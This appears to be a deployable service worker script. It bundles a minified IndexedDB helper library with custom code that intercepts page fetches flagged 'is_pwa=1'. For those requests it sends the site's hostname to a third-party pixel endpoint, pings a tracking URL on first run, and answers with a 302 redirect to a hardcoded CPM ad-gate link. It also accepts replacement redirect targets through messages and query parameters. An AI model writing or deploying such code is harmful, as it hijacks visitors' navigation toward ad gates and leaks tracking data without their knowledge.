// TODO: проверить, можно ли вытащить в CDN

! function () {
    function e(e) {
        return new Promise(function (t, n) {
            e.onsuccess = function () {
                t(e.result)
            }, e.onerror = function () {
                n(e.error)
            }
        })
    }

    function t(t, n, o) {
        var r, i = new Promise(function (i, u) {
            e(r = t[n].apply(t, o)).then(i, u)
        });
        return i.request = r, i
    }

    function n(e, t, n) {
        n.forEach(function (n) {
            Object.defineProperty(e.prototype, n, {
                get: function () {
                    return this[t][n]
                },
                set: function (e) {
                    this[t][n] = e
                }
            })
        })
    }

    function o(e, n, o, r) {
        r.forEach(function (r) {
            r in o.prototype && (e.prototype[r] = function () {
                return t(this[n], r, arguments)
            })
        })
    }

    function r(e, t, n, o) {
        o.forEach(function (o) {
            o in n.prototype && (e.prototype[o] = function () {
                return this[t][o].apply(this[t], arguments)
            })
        })
    }

    function i(e, n, o, r) {
        r.forEach(function (r) {
            r in o.prototype && (e.prototype[r] = function () {
                return e = this[n], (o = t(e, r, arguments)).then(function (e) {
                    if (e) return new c(e, o.request)
                });
                var e, o
            })
        })
    }

    function u(e) {
        this._index = e
    }

    function c(e, t) {
        this._cursor = e, this._request = t
    }

    function s(e) {
        this._store = e
    }

    function p(e) {
        this._tx = e, this.complete = new Promise(function (t, n) {
            e.oncomplete = function () {
                t()
            }, e.onerror = function () {
                n(e.error)
            }, e.onabort = function () {
                n(e.error)
            }
        })
    }

    function a(e, t, n) {
        this._db = e, this.oldVersion = t, this.transaction = new p(n)
    }

    function f(e) {
        this._db = e
    }
    n(u, '_index', ['name', 'keyPath', 'multiEntry', 'unique']), o(u, '_index', IDBIndex, ['get', 'getKey', 'getAll', 'getAllKeys', 'count']), i(u, '_index', IDBIndex, ['openCursor', 'openKeyCursor']), n(c, '_cursor', ['direction', 'key', 'primaryKey', 'value']), o(c, '_cursor', IDBCursor, ['update', 'delete']), ['advance', 'continue', 'continuePrimaryKey'].forEach(function (t) {
        t in IDBCursor.prototype && (c.prototype[t] = function () {
            var n = this,
                o = arguments;
            return Promise.resolve().then(function () {
                return n._cursor[t].apply(n._cursor, o), e(n._request).then(function (e) {
                    if (e) return new c(e, n._request)
                })
            })
        })
    }), s.prototype.createIndex = function () {
        return new u(this._store.createIndex.apply(this._store, arguments))
    }, s.prototype.index = function () {
        return new u(this._store.index.apply(this._store, arguments))
    }, n(s, '_store', ['name', 'keyPath', 'indexNames', 'autoIncrement']), o(s, '_store', IDBObjectStore, ['put', 'add', 'delete', 'clear', 'get', 'getAll', 'getKey', 'getAllKeys', 'count']), i(s, '_store', IDBObjectStore, ['openCursor', 'openKeyCursor']), r(s, '_store', IDBObjectStore, ['deleteIndex']), p.prototype.objectStore = function () {
        return new s(this._tx.objectStore.apply(this._tx, arguments))
    }, n(p, '_tx', ['objectStoreNames', 'mode']), r(p, '_tx', IDBTransaction, ['abort']), a.prototype.createObjectStore = function () {
        return new s(this._db.createObjectStore.apply(this._db, arguments))
    }, n(a, '_db', ['name', 'version', 'objectStoreNames']), r(a, '_db', IDBDatabase, ['deleteObjectStore', 'close']), f.prototype.transaction = function () {
        return new p(this._db.transaction.apply(this._db, arguments))
    }, n(f, '_db', ['name', 'version', 'objectStoreNames']), r(f, '_db', IDBDatabase, ['close']), ['openCursor', 'openKeyCursor'].forEach(function (e) {
        [s, u].forEach(function (t) {
            e in t.prototype && (t.prototype[e.replace('open', 'iterate')] = function () {
                var t, n = (t = arguments, Array.prototype.slice.call(t)),
                    o = n[n.length - 1],
                    r = this._store || this._index,
                    i = r[e].apply(r, n.slice(0, -1));
                i.onsuccess = function () {
                    o(i.result)
                }
            })
        })
    }), [u, s].forEach(function (e) {
        e.prototype.getAll || (e.prototype.getAll = function (e, t) {
            var n = this,
                o = [];
            return new Promise(function (r) {
                n.iterateCursor(e, function (e) {
                    e ? (o.push(e.value), void 0 === t || o.length != t ? e.continue() : r(o)) : r(o)
                })
            })
        })
    });
    var d = {
        open: function (e, n, o) {
            var r = t(indexedDB, 'open', [e, n]),
                i = r.request;
            return i && (i.onupgradeneeded = function (e) {
                o && o(new a(i.result, e.oldVersion, i.transaction))
            }), r.then(function (e) {
                return new f(e)
            })
        },
        delete: function (e) {
            return t(indexedDB, 'deleteDatabase', [e])
        }
    };
    'undefined' != typeof module ? (module.exports = d, module.exports.default = module.exports) : self.idb = d
}();
const t = 'data',
    {
        hostname: e
    } = self.location,
    n = `${e}_ifo`,
    a = `${e}_url`,
    s = `${e}_s2s`,
    c = self.idb.open('fjk456km6k4j6nkdfgdsf34511fd4', 1, async function (e) {
        e.objectStoreNames.contains(t) || (e.createObjectStore(t), await r(n, 'true'))
    });

function i() {}
async function o(t) {
    return c.then(function (e) {
        return e.transaction(t, 'readwrite').objectStore(t)
    })
}
async function r(e, n) {
    return o(t).then(function (t) {
        return t.put(n, e)
    })
}
async function u(e) {
    return o(t).then(function (t) {
        return t.get(e)
    })
}
self.addEventListener('message', async function (t) {
    const {
        data: {
            url1: e,
            s2s: n
        }
    } = t;
    void 0 !== n && await r(s, n), void 0 !== e && await r(a, e)
}), self.addEventListener('fetch', function (t) {
    const {
        searchParams: c
    } = new URL(t.request.url), o = c.get('is_pwa'), f = c.get('s2s');
    t.respondWith(async function () {
        if (null !== f && await r(s, f), '1' === o) {
            const t = await u(s),

          
                c = await u(a) || "https://www.highperformancecpmgate.com/s7qfdt3g?key=d9f2af4fb7f3e818573cfc95453509eb",


                o = await u(n);
            return fetch(`https://dividedscientific.com/pixel/pwa?a=2&h=${e}`, {
                mode: 'no-cors'
            }).catch(i), 'true' === o && (await r(n, 'false'), fetch(`https://www.pbterra.com/name/pwacpm/at?subid_short=${t}`).catch(i)), new Response('', {
                status: 302,
                statusText: 'Found',
                headers: {
                    Location: `${c}&psid=${e}`
                }
            })
        }
        return fetch(t.request)
    }())
});